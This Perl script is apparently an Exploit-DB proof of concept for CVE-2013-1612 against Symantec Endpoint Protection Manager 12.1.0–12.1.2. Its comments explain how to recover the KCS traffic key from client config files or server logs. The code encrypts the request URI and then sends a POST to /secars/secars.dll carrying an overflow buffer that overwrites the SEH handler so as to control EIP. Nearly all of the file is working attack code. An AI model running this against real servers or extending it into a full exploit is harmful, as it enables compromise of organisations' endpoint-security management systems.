# Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/33056-sepm-secars-poc-v0.3.tar.gz

#!/usr/bin/perl -w
# Exploit Title: Symantec Endpoint Protection Manager 12.1.x - SEH Overflow POC
# Date: 31 January 2013
# Exploit Author: st3n@funoverip.net (a.k.a. jerome.nokin@gmail.com)
# Vendor Homepage: http://http://www.symantec.com/en/uk/endpoint-protection
# Version: 12.1.0 -> 12.1.2
# Tested on: Windows 2003 Enterprise Edition SP2
# CVE : CVE-2013-1612
# More info on: http://funoverip.net/?p=1693
#
#=====================================================================================
#
# This POC code overwrite EIP with "CCCCCCCC"
#
# About KCS Key: That key is used to obfuscate traffic between client and server.
#                The key is generated during SEPM installation.
#                We need that key to talk with the SEPM server..
#
# Where to find KCS Key ? 
# On a managed client station. Search for "Kcs" inside:
#
# - Win7/Vista/W2k8/and more : 
#    C:\\ProgramData\\Symantec\\Symantec Endpoint Protection\\CurrentVersion\\Data\\Config\\SyLink.xml
# - Windows XP :
#    C:\\Document & Settings\\All Users\\Application Data\\Symantec\\Symantec Endpoint Protection\\
#    CurrentVersion\\Data\\Config\\SyLink.xml 
#
# On server side, check the logs:
#    C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection Manager\\data\\inbox\\log\\ersecreg.log
#=====================================================================================

use warnings;
use strict;
use IO::Socket::INET;
use SEPM::SEPM;


# SEP Manager host/ip
my $host        = "192.168.60.186";
my $port	= 8014;

# Kcs key
my $Kcs_hex     = "85FB05B288B45D92447A3EDCBEFC434E";

# ---- config end -----




# flush after every write
$| = 1;


# Send HTTP request function
sub send_request {
        my $param = shift;      # URL parameters
        my $post_data = shift;  # POST DATA
        my $sock = IO::Socket::INET->new("$host:$port");
        if($sock){
                print "Connected.. \n";

                # HTTP request
                my $req =
                        "POST /secars/secars.dll?h=$param HTTP/1.0\r\n" .
                        "User-Agent: Smc\r\n" .
                        "Host: $host\r\n" .
                        "Content-Length: " . length($post_data) . "\r\n" .
                        "\r\n" .
                        $post_data ;

                # Sending
                print $sock $req;

                # Read HTTP response
                my $resp = '';
                while(<$sock>){ $resp .=$_; }

                #print $resp;   
        	if($resp =~ /400 Bad Request/) {
                	print "\nERROR: Got '400 Bad Request' from the server. Wrong Kcs key ? Wrong SEP version ?\n";
                       
		}
	
		close $sock;
	}

}


# SEP object
my $sep = SEPM::SEPM->new();


print "[*] Target: $host:$port\n";
print "[*] KCS Key: $Kcs_hex\n";

# SEPM object for obfuscation
print "[*] Generating master encryption key\n";
$sep->genkey($Kcs_hex);

# Obfuscate URL parameters 
print "[*] Encrypting URI\n";
my $h = $sep->obfuscate("l=9&action=26");

# The evil buff
print "[*] Building evil buffer\n";
my $buf =
         "foo=[hex]" .   # [hex] call the vulnerable parsing function
	 "F" x 1288 .    # Junk
	 "B" x 8 .       # Pointer to next SEH record
	 "CCCCCCCC".     # SEH Handler, will overwrite EIP register	
	 "D" x 500;      # Trigger "Memory Access Violation" exception


# Sending request
print "[*] Sending HTTP request\n";
send_request($h,     # URL parameters
             $buf    # post data        
);


print "[*] Done\n";